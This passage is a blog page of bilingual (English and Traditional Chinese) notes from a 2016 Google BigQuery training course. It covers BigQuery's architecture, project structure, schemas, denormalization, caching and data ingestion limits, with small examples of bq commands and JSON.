&lt;li&gt;&lt;a href="https://developers.google.com/experts/"&gt;GDE: Cloud Developer Expert&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;Day 1: 2016/12/15&lt;/h1&gt;
&lt;hr /&gt;
&lt;h1&gt;Course Introduction&lt;/h1&gt;
&lt;hr /&gt;
&lt;h1&gt;Module 1: Introducing BigQuery&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;SMACK  &lt;ul&gt;
&lt;li&gt;Spark  &lt;/li&gt;
&lt;li&gt;Mesos  &lt;/li&gt;
&lt;li&gt;Akka  &lt;/li&gt;
&lt;li&gt;Cassandra  &lt;/li&gt;
&lt;li&gt;Kafka  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Big Data Current State&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Real-Time Streaming Data  &lt;/li&gt;
&lt;li&gt;Web analysis data  &lt;/li&gt;
&lt;li&gt;IoT sensor data  &lt;/li&gt;
&lt;li&gt;Fraud detection  &lt;/li&gt;
&lt;li&gt;一台 8-core, 32GB RAM 的 server 在普通情況下，大概撐不到 1000 個 concurrent connection  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;On Premises Versus Cloud&lt;/h2&gt;
&lt;p&gt;Premises =&amp;gt; Warehouse  &lt;/p&gt;
&lt;p&gt;公司有機房的聽眾：「申請一台機器最快要一個禮拜才能用，一台機器要撐 3~5 年。」  &lt;/p&gt;
&lt;h2&gt;Google's History of Innovation in Big Data&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Google Big Data Stack 1.0  &lt;ul&gt;
&lt;li&gt;2002: GFS  &lt;/li&gt;
&lt;li&gt;2004: MapReduce  &lt;/li&gt;
&lt;li&gt;2005: Bigtable  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Google Big Data Stack 2.0  &lt;ul&gt;
&lt;li&gt;2006: Dremel  &lt;ul&gt;
&lt;li&gt;Apache Drill  &lt;/li&gt;
&lt;li&gt;Query Engine  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;2010: Colossus  &lt;/li&gt;
&lt;li&gt;2011: Megastore  &lt;/li&gt;
&lt;li&gt;2012: Millwheel  &lt;ul&gt;
&lt;li&gt;處理 Streaming 的資料  &lt;/li&gt;
&lt;li&gt;和 Apache Beam 有關  &lt;/li&gt;
&lt;li&gt;Google Cloud Dataflow is based on Millwheel  &lt;/li&gt;
&lt;li&gt;Dataflow 會幫你預測資料大小，然後去做調整。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;What is BigQuery&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Fully-managed, analytics data warehouse.  &lt;ul&gt;
&lt;li&gt;Near real-time interactive analysis  &lt;ul&gt;
&lt;li&gt;batch / streaming  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;NoOps - No administration for performance and scale  &lt;ul&gt;
&lt;li&gt;但 OPs 還是得注意每天和每個月的 BigQuery 用量  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Reliable  &lt;/li&gt;
&lt;li&gt;Economical  &lt;/li&gt;
&lt;li&gt;Secure  &lt;ul&gt;
&lt;li&gt;可以透過 ACL 分享 dataset  &lt;/li&gt;
&lt;li&gt;Data is encrypted in transport and at rest  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Auditable  &lt;ul&gt;
&lt;li&gt;Immutable logs  &lt;ul&gt;
&lt;li&gt;除非是共用帳號，不然都找得到誰做了什麼事。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Scalable  &lt;ul&gt;
&lt;li&gt;Virtually unlimited data storeage and processing power.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Flexible  &lt;ul&gt;
&lt;li&gt;Streaming ingestion: 100K rows/sec per table for real-time data  &lt;/li&gt;
&lt;li&gt;Data mashup: JOIN across diverse datasets/projects  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Easy to use  &lt;ul&gt;
&lt;li&gt;Requires no indexes, keys, or partitions  &lt;/li&gt;
&lt;li&gt;Familiar SQL interface and intuitive UI  &lt;/li&gt;
&lt;li&gt;Nested and repeated field support for schema flexibility  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;BigQuery Is Not&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Transactional RDBMS  &lt;ul&gt;
&lt;li&gt;BigQuery is not an OLTP system  &lt;/li&gt;
&lt;li&gt;BigQuery 不像 RDBMS 要做正規化，反而是要做反正規化，讓資料愈扁平愈好  &lt;/li&gt;
&lt;li&gt;RDBMS 要求 query 要在數毫秒，但 BigQuery 的 query  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Operational Data Store  &lt;ul&gt;
&lt;li&gt;BigQuery is not geared towards capturing live data and applying updates/deletes as they happen in the system of record  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;On-premises solution or appliance  &lt;ul&gt;
&lt;li&gt;BigQuery is a self-contained, cloud-based solution  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Comparisons&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;OLTP (Online Transaciton Processing)  &lt;/li&gt;
&lt;li&gt;OLAP (Online Analytical Processing)  &lt;ul&gt;
&lt;li&gt;Similar in use cases they support  &lt;/li&gt;
&lt;li&gt;BigQuery allows querying via SQL  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;MapReduce  &lt;ul&gt;
&lt;li&gt;Fundamentally a batch oriented technology  &lt;/li&gt;
&lt;li&gt;Higher latency than BigQuery  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;NoSQL  &lt;ul&gt;
&lt;li&gt;Less scalable than BigQuery  &lt;/li&gt;
&lt;li&gt;Awkward or impossible to query - No query language  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;BigQuery Use Cases&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Games and social media analytics  &lt;/li&gt;
&lt;li&gt;Advertising campaign optimization  &lt;/li&gt;
&lt;li&gt;Sensor data analysis  &lt;/li&gt;
&lt;li&gt;POS-Retail Analytics  &lt;/li&gt;
&lt;li&gt;Web logs, machine logs, infrastructure monitoring  &lt;ul&gt;
&lt;li&gt;Google 利用 Machine Learning 分析 Machine logs 來去針對 server 做最佳的管理  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://cloud.google.com/solutions/mobile/mobile-gaming-analysis-telemetry"&gt;Mobile Gaming Analytics&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://cloud.google.com/customers/zulily/"&gt;Zulily  |  Google Cloud Platform&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Lab 1&lt;/h2&gt;
&lt;p&gt;&lt;a href="https://codelabs.developers.google.com/codelabs/cpb200-free-trial/#0"&gt;Sign Up for the Free Trial and Create a Project&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h1&gt;Module 2: BigQuery Functional Overview&lt;/h1&gt;
&lt;h2&gt;BigQuery Project Structure&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Project  &lt;ul&gt;
&lt;li&gt;Top-level structure  &lt;/li&gt;
&lt;li&gt;Contains users, APIs authentications, billing, data, access control lists (control access to datasets and jobs)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Dataset  &lt;ul&gt;
&lt;li&gt;Named parent of 1 or more tables  &lt;/li&gt;
&lt;li&gt;一堆 Table 的集合  &lt;/li&gt;
&lt;li&gt;Support Partition Tables  &lt;/li&gt;
&lt;li&gt;如果資料存入以後沒有異動，3個月以後，費用會減半。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Table  &lt;ul&gt;
&lt;li&gt;Columnar structure that stores data  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Job  &lt;ul&gt;
&lt;li&gt;Controls potentially long-running actions  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Projects&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;可以決定要把哪些 Table 分享給哪些人  &lt;/li&gt;
&lt;li&gt;已經做完的 Job 不用 Clean 掉，因為沒有說執行過多少 Job 就不能執行  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Datasets&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Reader  &lt;/li&gt;
&lt;li&gt;Editor  &lt;/li&gt;
&lt;li&gt;Owner  &lt;ul&gt;
&lt;li&gt;可以分享  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Tables&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Collection of columns, rows  &lt;/li&gt;
&lt;li&gt;Have a schema  &lt;/li&gt;
&lt;li&gt;Views are supported  &lt;/li&gt;
&lt;li&gt;Can be external (federated)  &lt;ul&gt;
&lt;li&gt;Google Cloud Storage, Google Drive  &lt;/li&gt;
&lt;li&gt;可以從外部載入資料，例如只想存在自己的 Cloud Storage 的資料  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Jobs&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;每一次執行 query 都會產生一個 Job  &lt;/li&gt;
&lt;li&gt;Job 是 by user 紀錄的  &lt;/li&gt;
&lt;li&gt;以前不能 update, 現在可以 update 了  &lt;ul&gt;
&lt;li&gt;可以直接使用 Job ID 來 update insert 的內容  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;BigQuery Storage&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Traditional RDBMS Storage  &lt;ul&gt;
&lt;li&gt;Row based  &lt;/li&gt;
&lt;li&gt;Record-oriented storage  &lt;/li&gt;
&lt;li&gt;透過 index 和正規化讓資料查詢可以更快速  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;BigQuery Storage  &lt;ul&gt;
&lt;li&gt;Column based  &lt;/li&gt;
&lt;li&gt;Columnar storage  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;BigQuery Managed Storage&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;BigQuery data is stored on persistent disks in distributed storage  &lt;/li&gt;
&lt;li&gt;No indexes, keys, or partitions are required  &lt;/li&gt;
&lt;li&gt;Scales to dozens of petabytes  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Storage Engine 2006-2015: ColumnIO&lt;/h3&gt;
&lt;p&gt;Date =&amp;gt; Decompress -&amp;gt; Filter (MapReduce) =&amp;gt; Emit  &lt;/p&gt;
&lt;h3&gt;Storage Engine 2016-Now: Capacitor&lt;/h3&gt;
&lt;p&gt;Data =&amp;gt; Emit =&amp;gt; Dictionary =&amp;gt; Filter =&amp;gt; Lookup  &lt;/p&gt;
&lt;p&gt;ref: &lt;a href="https://cloud.google.com/blog/big-data/2016/04/inside-capacitor-bigquerys-next-generation-columnar-storage-format"&gt;https://cloud.google.com/blog/big-data/2016/04/inside-capacitor-bigquerys-next-generation-columnar-storage-format&lt;/a&gt;  &lt;/p&gt;
&lt;h2&gt;BigQuery Processing&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Borg - Cluster management system  &lt;/li&gt;
&lt;li&gt;Dremel query engine  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Query Processing 2006-2015&lt;/h3&gt;
&lt;p&gt;Mixer 0 &amp;lt;= Mixer 1 &amp;lt;= Leaf &amp;lt;= Juniper (Network) =&amp;gt; Distributed Storage (Colossus)  &lt;/p&gt;
&lt;h3&gt;Query Processing 2015-Present&lt;/h3&gt;
&lt;p&gt;Master &amp;lt;= Shard &amp;lt;= Shard &amp;lt;= Shard &amp;lt;= Juniper (Network) =&amp;gt; Distributed Storage (Colossus)  &lt;/p&gt;
&lt;h2&gt;BigQuery Web User Interface&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;要不要用 Cache  &lt;/li&gt;
&lt;li&gt;要不要用 Legacy SQL  &lt;/li&gt;
&lt;li&gt;查詢前記得按一下右邊的 Validator，檢查語法順便看一下總共會 Query 多少資料，以免費用爆表。  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;BigQuery CLI&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;可以從 Cloud Shell 或 Cloud SDK 使用 bq  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;bq help&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;bq ls&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;bq mk&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;bq load&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Lab 2&lt;/h2&gt;
&lt;p&gt;&lt;a href="https://codelabs.developers.google.com/codelabs/cpb200-bigquery-interfaces/#0"&gt;BigQuery Interfaces&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h1&gt;Module 3: BigQuery Fundamentals&lt;/h1&gt;
&lt;h2&gt;BigQuery Schemas&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Consist of 1 or more fields (flat or nested)  &lt;/li&gt;
&lt;li&gt;Define the field name, data type, and mode of columns in the table  &lt;/li&gt;
&lt;li&gt;Fields are strongly typed (explicitly defined)  &lt;/li&gt;
&lt;li&gt;Modes indicate whether field data is REQUIRED, NULLABLE or REPEATED  &lt;ul&gt;
&lt;li&gt;REQUIRED fields must contain non-null data  &lt;/li&gt;
&lt;li&gt;NULLABLE fields allow null values  &lt;/li&gt;
&lt;li&gt;REPEATED fields contain an array of values  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Schema Specification&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Specify schema on command line or in JSON file  &lt;/li&gt;
&lt;li&gt;Schema file must contain single array object with entries that provide these properties:  &lt;ul&gt;
&lt;li&gt;"name": Name of the column  &lt;/li&gt;
&lt;li&gt;"type": Type of data  &lt;/li&gt;
&lt;li&gt;"mode" (optional): REQUIRED, NULLABLE or REPEATED  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Example JSON schema:  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;[  
    {&amp;quot;name&amp;quot;: &amp;quot;name&amp;quot;, &amp;quot;type&amp;quot;: &amp;quot;string&amp;quot;, &amp;quot;mode&amp;quot;: &amp;quot;required&amp;quot;},  
    {&amp;quot;name&amp;quot;: &amp;quot;gender&amp;quot;, &amp;quot;type&amp;quot;: &amp;quot;string&amp;quot;, &amp;quot;mode&amp;quot;: &amp;quot;nullable&amp;quot;},  
    {&amp;quot;name&amp;quot;: &amp;quot;count&amp;quot;, &amp;quot;type&amp;quot;: &amp;quot;integer&amp;quot;, &amp;quot;mode&amp;quot;: &amp;quot;required&amp;quot;}  
]  
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Denormalized Data in BigQuery&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;BigQuery uses a denormalized or "flat" schema  &lt;ul&gt;
&lt;li&gt;Flatten normalized tables for super-fast querying  &lt;/li&gt;
&lt;li&gt;No performance penalty for sparse columns or duplicate data  &lt;/li&gt;
&lt;li&gt;Pre-join datasets into homogeneous tables  &lt;/li&gt;
&lt;li&gt;Trade JOINS for column scans  &lt;ul&gt;
&lt;li&gt;Storage is more performant and cheaper than compute resources  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Use nested repeated schema (using JSON or AVRO format) to simulate normalization benefits and limit duplication of data  &lt;ul&gt;
&lt;li&gt;Without nesting, aggregation or JOINs are required  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Denormalization Example&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;A normalized one-to-many relationship between people and cities_lived is denormalized (“flattened”) into 1 table  &lt;ul&gt;
&lt;li&gt;A person may have one to many rows in the table  &lt;/li&gt;
&lt;li&gt;Name, age, and gender may be duplicated  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Using nested repeated schema avoids duplication of data  &lt;/li&gt;
&lt;li&gt;Still allows for a flattened table, which retains high performance  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;BigQuery Jobs&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;BigQuery defines and executes jobs for:  &lt;ul&gt;
&lt;li&gt;Query execution  &lt;/li&gt;
&lt;li&gt;Loading, copying, and exporting data  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Jobs are atomic  &lt;/li&gt;
&lt;li&gt;Multiple jobs can run concurrently  &lt;/li&gt;
&lt;li&gt;Completed jobs are listed in the jobs collection  &lt;/li&gt;
&lt;li&gt;Jobs have 4 components:  &lt;ul&gt;
&lt;li&gt;Reference – Job ID  &lt;/li&gt;
&lt;li&gt;Configuration – Job task  &lt;/li&gt;
&lt;li&gt;Status – Job state  &lt;/li&gt;
&lt;li&gt;Statistics – Job statistics  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Job History 是 by user 的  &lt;ul&gt;
&lt;li&gt;要看到整個 project 的 BigQuery Job History 的話，要到 Cloud Logging 那邊選擇 BigQuery 查看  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Destination Tables and Caching&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Query results are stored in a destination table  &lt;/li&gt;
&lt;li&gt;Table is temporary or user-defined  &lt;/li&gt;
&lt;li&gt;Temporary tables are:  &lt;ul&gt;
&lt;li&gt;Defined by the service  &lt;/li&gt;
&lt;li&gt;Used as query cache – You are not billed for storage  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;User-defined tables:  &lt;ul&gt;
&lt;li&gt;Remain persistent  &lt;/li&gt;
&lt;li&gt;Are billed at normal storage rates  &lt;/li&gt;
&lt;li&gt;Target location can be any accessible project/dataset  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Query Caching&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Query results are cached to improve performance  &lt;ul&gt;
&lt;li&gt;Subject to same quota policies as non-cached queries  &lt;/li&gt;
&lt;li&gt;Cache results have a size limit of 128 MB compressed  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;No charge for queries that use cached results  &lt;/li&gt;
&lt;li&gt;Results are cached for approximately 24 hours  &lt;ul&gt;
&lt;li&gt;Lifetime extended when a query returns a cached result  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Cache can be turned off  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;在 Web UI 要怎麼知道是 Cached Query? =&amp;gt; 仔細看算 query 時間結果後面的小括號，會標示 cached。  &lt;/p&gt;
&lt;h4&gt;Caveats&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;Query caching only works for predictable queries  &lt;ul&gt;
&lt;li&gt;When result set is identical to previous run(s) of a query  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Cache is per-user  &lt;ul&gt;
&lt;li&gt;Not shareable across users  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Cache is invalidated if:  &lt;ul&gt;
&lt;li&gt;Data in underlying table(s) changes  &lt;/li&gt;
&lt;li&gt;Query uses dynamic functions, such as &lt;code&gt;CURRENT_TIMESTAMP()&lt;/code&gt; or &lt;code&gt;NOW()&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Lab 3&lt;/h2&gt;
&lt;p&gt;&lt;a href="https://codelabs.developers.google.com/codelabs/cpb200-bigquery-components/#0"&gt;BigQuery Components and Jobs&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h1&gt;Module 4: Ingesting, Transforming and Storing Data&lt;/h1&gt;
&lt;h2&gt;Ingesting Data&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Load data into BigQuery using CLI, web UI, or API  &lt;/li&gt;
&lt;li&gt;Load data directly into BigQuery storage using streaming insert or a load job  &lt;/li&gt;
&lt;li&gt;Load jobs support:  &lt;ul&gt;
&lt;li&gt;Google Cloud Storage  &lt;ul&gt;
&lt;li&gt;Standard, Durable Reduced Availability, or Nearline (reduced performance)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Google Drive (JSON, CSV, AVRO, Sheets (first tab only))  &lt;/li&gt;
&lt;li&gt;CSV, JSON, &lt;a href="https://avro.apache.org/docs/current/"&gt;AVRO&lt;/a&gt; file uploads (slower)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Can also use partner-provided tools/services  &lt;/li&gt;
&lt;li&gt;Load jobs support four data sources:  &lt;ul&gt;
&lt;li&gt;Objects in Google Cloud Storage  &lt;/li&gt;
&lt;li&gt;Data sent with the job or streaming insert  &lt;/li&gt;
&lt;li&gt;A Google Cloud Datastore backup  &lt;/li&gt;
&lt;li&gt;Data in Google Drive  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Data can be:  &lt;ul&gt;
&lt;li&gt;Loaded into a new table  &lt;/li&gt;
&lt;li&gt;Appended to a table  &lt;/li&gt;
&lt;li&gt;Used to overwrite a table  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;BigQuery can ingest both compressed (GZIP) and uncompressed files  &lt;ul&gt;
&lt;li&gt;Highly parallel load operations allow uncompressed files to load significantly faster than compressed files  &lt;/li&gt;
&lt;li&gt;Uncompressed files are larger  &lt;ul&gt;
&lt;li&gt;Possible bandwidth limitations  &lt;/li&gt;
&lt;li&gt;More costly to store  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Weigh compression options based on use case  &lt;/li&gt;
&lt;li&gt;File size limits  &lt;ul&gt;
&lt;li&gt;CSV  &lt;ul&gt;
&lt;li&gt;Compressed: 4GB  &lt;/li&gt;
&lt;li&gt;Uncompressed  &lt;ul&gt;
&lt;li&gt;With newlines: 4GB  &lt;/li&gt;
&lt;li&gt;Without newlines: 5TB  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;JSON (newline delimited)  &lt;ul&gt;
&lt;li&gt;Compressed: 4 GB  &lt;/li&gt;
&lt;li&gt;Uncompressed: 5 TB  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;AVRO  &lt;ul&gt;
&lt;li&gt;Compressed: Compressed files not supported; compressed data blocks are.  &lt;/li&gt;
&lt;li&gt;Uncompressed: 5 TB (2 MB for the file header)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;Datastore == BigTable + &lt;a href="http://research.google.com/pubs/pub36971.html"&gt;MegaStore&lt;/a&gt;  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2&gt;Appending and Reloading Data&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Use CLI or API to append data to an existing table  &lt;/li&gt;
&lt;li&gt;BigQuery does support deletes now (If unchecked the "use Legacy SQL")  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Lab 4.1&lt;/h2&gt;
&lt;p&gt;&lt;a href="https://codelabs.developers.google.com/codelabs/cpb200-loading-data/#0"&gt;Loading Data into BigQuery and Using Federated Queries&lt;/a&gt;  &lt;/p&gt;
&lt;h2&gt;Processing/Transforming Data&lt;/h2&gt;
&lt;h3&gt;Schema Design Considerations&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Denormalized versus relational  &lt;ul&gt;
&lt;li&gt;Denormalized yields better performance with some duplication  &lt;/li&gt;
&lt;li&gt;JOINS on relational data are performant but can be slower than queries on denormalized data  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Flat versus nested and repeated  &lt;/li&gt;
&lt;li&gt;Table partitioning  &lt;ul&gt;
&lt;li&gt;Single table for all data  &lt;/li&gt;
&lt;li&gt;Partition data by some range of values (date) - covered later  &lt;/li&gt;
&lt;li&gt;Table decorators (partition, snapshot) - covered later  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;@&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://cloud.google.com/bigquery/table-decorators"&gt;https://cloud.google.com/bigquery/table-decorators&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://blog.gdeltproject.org/using-bigquery-table-decorators-to-lower-query-cost/"&gt;http://blog.gdeltproject.org/using-bigquery-table-decorators-to-lower-query-cost/&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Data Format Considerations&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;BigQuery supports three data formats: AVRO, JSON, CSV  &lt;/li&gt;
&lt;li&gt;AVRO:  &lt;ul&gt;
&lt;li&gt;Open source format that bundles serialized data and schema in same file  &lt;/li&gt;
&lt;li&gt;Supports flat data and nested/repeated fields  &lt;ul&gt;
&lt;li&gt;Nested/repeated data useful for expressing hierarchical data, reduces duplication when denormalizing data  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Loads faster in BigQuery if data contains embedded newlines  &lt;/li&gt;
&lt;li&gt;Limited to 16 MB block size  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;JSON (newline-delimited):  &lt;ul&gt;
&lt;li&gt;Supports flat data and nested/repeated fields  &lt;ul&gt;
&lt;li&gt;Nested/repeated data useful for expressing hierarchical data, reduces duplication when denormalizing data  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Loads faster in BigQuery if data contains embedded newlines  &lt;/li&gt;
&lt;li&gt;One JSON object, including any nested/repeated fields, must appear on each line  &lt;/li&gt;
&lt;li&gt;Supports UTF-8 encoding  &lt;/li&gt;
&lt;li&gt;Limited to 2 MB row size  &lt;/li&gt;
&lt;li&gt;Example  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;{&amp;quot;name&amp;quot;: &amp;quot;abc&amp;quot;, &amp;quot;gender&amp;quot;: &amp;quot;M&amp;quot;, &amp;quot;age&amp;quot;: 38}  
{&amp;quot;name&amp;quot;: &amp;quot;abc&amp;quot;, &amp;quot;gender&amp;quot;: &amp;quot;M&amp;quot;, &amp;quot;age&amp;quot;: 48}  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;CSV:  &lt;ul&gt;
&lt;li&gt;Supports flat data only  &lt;ul&gt;
&lt;li&gt;No nested/repeated data  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Supports UTF-8 encoding and ISO-8859-1 encoding  &lt;ul&gt;
&lt;li&gt;If loading ISO-8859-1 encoded data, specify configuration.load.encoding property when creating load job  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Limited to 2 MB row and cell size  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Storing Data&lt;/h2&gt;
&lt;h3&gt;Long-Term Storage in BigQuery&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Automatic discount for data stored longer than 90 days  &lt;ul&gt;
&lt;li&gt;If table data modified, 90-day counter resets  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;No need to delete or archive old data  &lt;ul&gt;
&lt;li&gt;Equivalent to cost of Cloud Storage Nearline  &lt;/li&gt;
&lt;li&gt;量大的時候似乎還是會比較貴，所以還是有人選擇 archive 到 GCS  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;If preferred, store data in Cloud Storage and load into BigQuery when needed  &lt;ul&gt;
